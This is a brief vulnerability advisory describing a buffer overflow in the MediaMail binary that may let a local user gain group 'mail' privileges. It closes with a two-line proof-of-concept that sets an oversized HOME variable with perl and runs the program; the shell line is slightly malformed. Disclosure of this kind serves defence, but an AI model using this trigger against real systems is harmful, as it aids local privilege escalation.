A buffer overflow vulnerability has been reported for the MediaMail binary that may result in a user obtaining elevated privileges.

Although unconfirmed, an attacker, using a custom crafted string, could overwrite stack memory, including the return address of a function, and potentially execute arbitrary code with group 'mail' privileges.

sh$ export $HOME=`perl -e 'print "A"x12096'
sh$ /usr/bin/X11/MediaMail
